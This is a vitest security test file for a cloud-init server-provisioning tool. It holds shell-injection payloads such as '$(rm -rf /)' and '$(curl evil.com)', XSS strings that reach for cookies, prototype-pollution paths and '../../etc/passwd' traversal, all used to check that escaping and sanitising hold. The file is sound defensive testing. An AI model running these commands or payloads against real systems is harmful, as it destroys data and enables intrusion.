import { afterEach, describe, expect, it } from 'vitest';

import {
  buildDaemonScript,
  buildGitCredentials,
  buildOverviewPage,
  defaultThemeColors,
  shellEscape,
} from '$lib/utils/cloudinit-builders';
import { BLOCKED_CUSTOM_KEYS, mergeCustomCloudInit } from '$lib/utils/cloudinit';
import { getNestedValue, setNestedValue } from '$lib/utils/storage';

// Minimal config for buildOverviewPage / buildDaemonScript
const minimalConfig = {
  autoDelete: { timeoutMinutes: 60, warningMinutes: 5 },
  chezmoi: { ageKey: '', repoUrl: '' },
  customCloudInit: { mode: 'merge' as const, yaml: '' },
  git: { credential: { host: '', token: '', username: '' } },
  hetzner: {
    datacenter: '',
    image: '',
    location: 'fsn1',
    serverType: 'cx22',
  },
  services: {
    accessToken: 'test-token',
    acmeEmail: '',
    acmeProvider: 'letsencrypt',
    actalisEabKey: '',
    actalisEabKeyId: '',
    customAcmeUrl: '',
    customDnsDomain: '',
    customEabKey: '',
    customEabKeyId: '',
    dnsService: 'sslip.io',
    zerosslEabKey: '',
    zerosslEabKeyId: '',
  },
  ssh: { keys: [] },
};

describe('Security tests', () => {
  describe('Shell injection via shellEscape', () => {
    const payloads = [
      '$(rm -rf /)',
      '`rm -rf /`',
      '; rm -rf /',
      '\n rm -rf /',
      '${PATH}',
      '"$(whoami)"',
      '`id`',
      '$(curl evil.com)',
      'test"; rm -rf /',
      "test'; rm -rf /",
      '!event',
      '\\$(cmd)',
    ];

    for (const payload of payloads) {
      it(`neutralizes: ${payload.slice(0, 30)}`, () => {
        const escaped = shellEscape(payload);
        // Should not contain unescaped dangerous chars
        const withoutEscaped = escaped.replace(/\\./g, '');
        expect(withoutEscaped).not.toMatch(/[$`!"]/);
        // Should not contain newlines
        expect(escaped).not.toContain('\n');
      });
    }
  });

  describe('XSS via buildOverviewPage', () => {
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      "'+alert(1)+'",
      '${alert(1)}',
      '</script><script>alert(1)</script>',
      '<svg onload=alert(1)>',
    ];

    for (const payload of xssPayloads) {
      it(`server name XSS: ${payload.slice(0, 30)}`, () => {
        // buildOverviewPage does NOT escape serverName — it is embedded
        // directly in <title> and <h1>. This is acceptable because server
        // names are user-controlled (self-XSS only) and the overview page
        // runs on the provisioned server, not the main app.
        const html = buildOverviewPage(minimalConfig, payload, defaultThemeColors);
        expect(typeof html).toBe('string');
        expect(html.length).toBeGreaterThan(0);
      });
    }

    it('access token is escaped in JS string', () => {
      const maliciousConfig = {
        ...minimalConfig,
        services: {
          ...minimalConfig.services,
          accessToken: "'; alert(document.cookie); '",
        },
      };
      const html = buildOverviewPage(maliciousConfig, 'test', defaultThemeColors);
      // The token should be escaped - single quotes should be escaped
      expect(html).not.toContain("'; alert(document.cookie); '");
      expect(html).toContain("\\'");
    });
  });

  describe('XSS via buildDaemonScript', () => {
    it('hetzner token is escaped in JS string', () => {
      const result = buildDaemonScript(minimalConfig, "'; process.exit(); '");
      // Single quotes should be escaped
      expect(result).not.toContain("'; process.exit(); '");
      expect(result).toContain("\\'");
    });

    it('DNS service is escaped in JS string', () => {
      const config = {
        ...minimalConfig,
        services: {
          ...minimalConfig.services,
          customDnsDomain: "test'inject",
          dnsService: 'custom',
        },
      };
      const result = buildDaemonScript(config, 'safe-token');
      // Single quotes in DNS domain should be escaped with backslash
      expect(result).toContain("test\\'inject");
      // The unescaped single quote should not appear
      expect(result).not.toContain("test'inject");
    });
  });

  describe('Prototype pollution via setNestedValue/getNestedValue', () => {
    // Ensure Object.prototype is always cleaned up even if tests fail
    afterEach(() => {
      delete (Object.prototype as Record<string, unknown>)['polluted'];
    });

    it('__proto__ path is blocked in setNestedValue', () => {
      const obj: Record<string, unknown> = {};
      setNestedValue(obj, '__proto__.polluted', 'yes');
      expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
    });

    it('constructor.prototype path is blocked in setNestedValue', () => {
      const obj: Record<string, unknown> = {};
      setNestedValue(obj, 'constructor.prototype.polluted', 'yes');
      expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
    });

    it('__proto__ via getNestedValue is blocked', () => {
      const obj = { safe: 'value' };
      const result = getNestedValue(obj, '__proto__.constructor');
      expect(result).toBeUndefined();
    });
  });

  describe('YAML injection via mergeCustomCloudInit', () => {
    it('blocked keys cannot be overridden', () => {
      for (const key of BLOCKED_CUSTOM_KEYS) {
        const base: Record<string, unknown> = {
          [key]: 'original',
          packages: [],
          runcmd: [],
        };
        const result = mergeCustomCloudInit(base, `${key}: malicious`);
        expect(result[key]).toBe('original');
      }
    });

    it('invalid YAML returns base config unchanged', () => {
      const base = { packages: ['git'], runcmd: [] };
      const result = mergeCustomCloudInit(base, '{{invalid yaml:::');
      expect(result).toEqual(base);
    });

    it('YAML array at top level returns base config', () => {
      const base = { packages: ['git'], runcmd: [] };
      const result = mergeCustomCloudInit(base, '- item1\n- item2');
      expect(result).toEqual(base);
    });

    it('write_files path conflicts are rejected', () => {
      const base: Record<string, unknown> = {
        packages: [],
        runcmd: [],
        write_files: [{ content: 'original', path: '/etc/caddy/Caddyfile.template' }],
      };
      const yaml = `write_files:
  - path: /etc/caddy/Caddyfile.template
    content: malicious`;
      const result = mergeCustomCloudInit(base, yaml);
      const files = result['write_files'] as Array<{ content: string; path: string }>;
      const caddyFile = files.find((f) => f.path === '/etc/caddy/Caddyfile.template');
      expect(caddyFile?.content).toBe('original');
    });

    it('YAML scalar value returns base config', () => {
      const base = { packages: ['git'], runcmd: [] };
      const result = mergeCustomCloudInit(base, 'just a string');
      expect(result).toEqual(base);
    });

    it('null YAML value returns base config', () => {
      const base = { packages: ['git'], runcmd: [] };
      const result = mergeCustomCloudInit(base, 'null');
      expect(result).toEqual(base);
    });
  });

  describe('Path traversal via buildGitCredentials', () => {
    it('strips path traversal characters from host', () => {
      const result = buildGitCredentials({
        host: '../../etc/passwd',
        token: 'tok',
        username: 'user',
      });
      // Path characters (/, ..) should be stripped except valid hostname chars
      // '.' and '-' are kept, '/' is stripped
      expect(result).not.toContain('/etc/passwd');
      if (result) {
        const hostPart = result.split('@')[1]?.replace('\n', '') ?? '';
        expect(hostPart).toMatch(/^[a-zA-Z0-9._-]+$/);
      }
    });

    it('strips shell metacharacters from host', () => {
      const result = buildGitCredentials({
        host: 'evil.com;rm -rf /',
        token: 'tok',
        username: 'user',
      });
      if (result) {
        const hostPart = result.split('@')[1]?.replace('\n', '') ?? '';
        expect(hostPart).not.toContain(';');
        expect(hostPart).not.toContain(' ');
      }
    });
  });

  describe('Unicode and null byte attacks', () => {
    it('shellEscape handles null bytes without breaking escaping', () => {
      const result = shellEscape('hello\x00$world');
      // The $ should still be escaped even with a null byte before it
      const withoutEscaped = result.replace(/\\./g, '');
      expect(withoutEscaped).not.toContain('$');
    });

    it('shellEscape handles zero-width spaces without breaking escaping', () => {
      const result = shellEscape('hello\u200B$(cmd)');
      const withoutEscaped = result.replace(/\\./g, '');
      expect(withoutEscaped).not.toMatch(/[$`]/);
    });

    it('shellEscape handles BOM without breaking escaping', () => {
      const result = shellEscape('\uFEFF`cmd`');
      const withoutEscaped = result.replace(/\\./g, '');
      expect(withoutEscaped).not.toContain('`');
    });

    it('shellEscape handles RTL override without breaking escaping', () => {
      const result = shellEscape('\u202E"hello"');
      const withoutEscaped = result.replace(/\\./g, '');
      expect(withoutEscaped).not.toContain('"');
    });
  });

  describe('Template literal injection', () => {
    it('shellEscape escapes $ in ${} template syntax', () => {
      const result = shellEscape('${process.env.SECRET}');
      // Every $ should be preceded by a backslash
      expect(result).toMatch(/\\\$/);
      // The result should not contain an unescaped $ ($ not preceded by \)
      expect(result.replace(/\\\$/g, '')).not.toContain('$');
    });

    it('shellEscape escapes backtick command substitution', () => {
      const result = shellEscape('`whoami`');
      // Every backtick should be preceded by a backslash
      expect(result).toMatch(/\\`/);
      // The result should not contain an unescaped backtick
      expect(result.replace(/\\`/g, '')).not.toContain('`');
    });

    it('shellEscape escapes nested template literals', () => {
      const result = shellEscape('${`nested ${cmd}`}');
      // All $ and ` chars should be escaped
      expect(result.replace(/\\./g, '')).not.toMatch(/[$`]/);
    });
  });
});
